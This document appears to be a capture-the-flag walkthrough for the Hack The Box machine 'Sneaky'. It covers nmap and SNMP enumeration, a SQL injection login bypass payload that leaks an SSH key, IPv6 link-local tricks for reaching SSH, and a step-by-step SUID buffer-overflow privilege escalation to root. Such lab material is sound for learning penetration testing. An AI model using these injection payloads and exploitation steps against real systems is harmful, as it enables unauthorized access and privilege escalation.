1. Perform nmap scan, 
root@kali:~/htb/sneaky/nmap# nmap -sV -sC -oA results 10.10.10.20
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-02 15:08 EST
Nmap scan report for 10.10.10.20
Host is up (0.084s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Under Development!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.50 seconds

2. Go to http webpage, we get a page is under development page. We can try and gobuster or try going to /dev
and figure out what is there. A login page for members only. Send request over to repeater. We can also
brute force some of the credentials, but in this case for a sql injection.

Example:
POST /dev/login.php HTTP/1.1
Host: 10.10.10.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.20/dev/
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Connection: close
Upgrade-Insecure-Requests: 1

name=admin&pass=amdin'

AND we get:
<?xml version="1.0" encoding="UTF-8"?>Internal Serever Error: 

There is a sql injection. Now lets try a simple 1=1

	name=admin&pass=amdin' OR 1=1 -- -

And we get a login prompt:

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
    "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xml:lang="ja" xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>DevWebsite</title>
</head>
<body>
<h1>DevWebsite Login</h1>
<dt>
<dl>name: admin</dl>
</dt>
<dt>
<dl>name: thrasivoulos</dl>
</dt>
<p>
<p>
<p>
<p><center><a href="sshkeyforadministratordifficulttimes">My Key</a></center>
<p><center>Noone is ever gonna find this key :P</center>

There is an ssh key we can save out and the users as well:
name: admin
name: thrasivoulos

wget http://10.10.10.20/dev/sshkeyforadministratordifficulttimes

3. Now that we have all this stuff we should try to enumerate for more information such as running a udp 
scan and launching a sqlmap attack to see if we missed anything.

Miscellanoeus: Mentions Hurricane Electric Internet Services as possible use for VPN with IPv6

FE80 addresses are routable if on same network, if not listening in ipv4 maybe ipv6 network might work.

To conduct attack, we need to get unto a machine on the local network, in this case using the lame machine 
available  and querying for its mac address.
We first ping the machine from "lame" in order to store the mac address locally in lame 
arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.10.10.20              ether   00:50:56:B9:65:79   C                     eth0

Now we calulate the local link pv6 addess by doing the following:
0050:56B9:6579
First "fe80::", then invert 7th bit so it looks like this 0000 0010, so the next 4 bytes look like this 
"0250" then we add the next 2 bytes from mac address "56" and now add "ff:fe" as the next portion, and 
finally add the rest of the mac address "B9:6579"
fe80::0250:56ff:feB9:6579

Now we can ping the machine like the following:
root@lame:/# ping6 fe80::0250:56ff:feB9:6579%eth0
ping6 fe80::0250:56ff:feB9:6579%eth0
PING fe80::0250:56ff:feB9:6579%eth0(fe80::250:56ff:feb9:6579) 56 data bytes
64 bytes from fe80::250:56ff:feb9:6579: icmp_seq=1 ttl=64 time=2.93 ms
64 bytes from fe80::250:56ff:feb9:6579: icmp_seq=2 ttl=64 time=0.234 ms
64 bytes from fe80::250:56ff:feb9:6579: icmp_seq=3 ttl=64 time=0.270 ms

We need to add "%eth0" otherwise the ping will not work as it will not know to which interface to send it
to.


root@lame:/root# ssh -i sneaky.key  thrasivoulos@fe80::0250:56ff:feB9:6579%eth0

AND that is method 1 to enter box


4. Another way to get in is to take advantage of those multicast addresses
To ping all neighbors do somehting like the following:
ping6 -I eth0 ff02::1

Then,
ip -6 neigh

Use alive6 binary from "the hackers choice" to be able to discover windows boxes as well.


5. Now fo the intentional way, running udp scan
	nmap -sU -sC -oN udp-scan 10.10.10.20
We find out that snmp is available and we can bruteforce to get community strings with a tool called
"onesixtyone". However we are going to use snmpwalk with the public string that we got from nmap.

	snmpwalk -v2c -c public 10.10.10.20
and from mib info use the following
	snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.3

We download the mibs required for use: apt install snmp-mibs-downloader
and now we enable them by going to /etc/snmp/snmp.conf
and comment out the mibs

OR you could download a tool that does this for you without modifying the configuration file,
	git clone https://github.com/trickster0/Enyx.git
	python enyx.py 2c public 10.10.10.20
	
	[+] Snmpwalk found.
	[+] Grabbing IPv6.
	[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
	[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:6579
	[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:6579

Now we can ssh,
	ssh -i sneaky.key thrasivoulos@dead:beef:0000:0000:0250:56ff:feb9:6579

6. Next we will find an suid file that we can exploit this is the done via the following,
	find / -perm -4000 2>/dev/null
The chal binary is what we want to download 
"/usr/local/bin/chal"

We install checksec on our local system
apt install checksec -y


We verify that dep is disabled and aslr is disabled so exploiting this is relatively easy.
We are going to perform a buffer overflow.

	locate pattern_create
	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
	
	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq

Now we use gdb on the sneaky box,
	gdb /usr/local/bin/chal
	r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
	Program received signal SIGSEGV, Segmentation fault.
	0x316d4130 in ?? ()

Now we find the offset, 
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x316d4130
	[*] Exact match at offset 362

We have eip overwrite, now we create a skeleton exploit. We will also pull shellcode from the internet 
to execute /bin/sh, go to packetstorm website
	https://packetstormsecurity.com/files/115010/Linux-x86-execve-bin-sh-Shellcode.html

While in gdb to obtain the EIP needed, we execute the following in gdb
	r $(python -c 'print "A"*400')
	x/100x $esp
	x/100x $esp-400

We now grab a memory hex value and use little endian to use it for our exploit python program.
(gdb) x/100x $esp-400
0xbffff3b0:	0xbffff3d2	0x00000000	0x00000000	0x08048441
0xbffff3c0:	0xbffff3d2	0xbffff712	0x0804821d	0xb7fffc24
0xbffff3d0:	0x414118fc	0x41414141	0x41414141	0x41414141
0xbffff3e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff3f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff400:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff410:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff420:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff430:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff440:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff450:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff460:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff470:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff480:	0x41414141	0x41414141	0x41414141	0x41414141

We might get an error with ou exploit so we need to find the exact point where our NOP sled begins and edit 
our exploit address

(gdb) r $(python exploit.py )

(gdb) x/100x $esp-400

Look for those NOP sleds, our shell code might have been to large to actually be able to execute properly
so trying different memory addresses might get the exploit to work. You should be able to get a root shell.
